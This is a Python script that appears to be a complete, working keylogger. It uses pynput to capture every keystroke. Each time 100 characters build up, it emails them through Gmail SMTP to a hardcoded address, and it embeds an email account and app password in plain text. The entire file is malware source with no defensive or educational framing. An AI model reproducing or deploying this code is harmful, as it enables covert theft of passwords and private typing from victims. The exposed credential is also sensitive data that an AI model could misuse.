from pynput.keyboard import Listener
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

keystrokes = ""

def log_happykey(key):
    global keystrokes
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    elif key == 'Key.enter':
        key = '\n'
    elif key == 'Key.shift':
        key = ''
    elif key == 'Key.backspace':
        key = '<'

    keystrokes += key

    # Check if the accumulated keystrokes reach 100, then send an email. Change this number as you like
    if len(keystrokes) >= 100:
        send_email_with_content(keystrokes)
        keystrokes = ""  #Reset keystrokes after sending the email

def send_email_with_content(content):
    from_email = "anonymous3.in@gmail.com"
    to_email = "anonymous3.in@gmail.com"
    password = "nglb wazj mhsp dgxq"

    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = "Keystrokes has returned"
    msg.attach(MIMEText(content, 'plain'))

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(from_email, password)

    server.sendmail(from_email, to_email, msg.as_string())

    server.quit()

#Start keystroke logging
with Listener(on_press=log_happykey) as l:
    l.join()
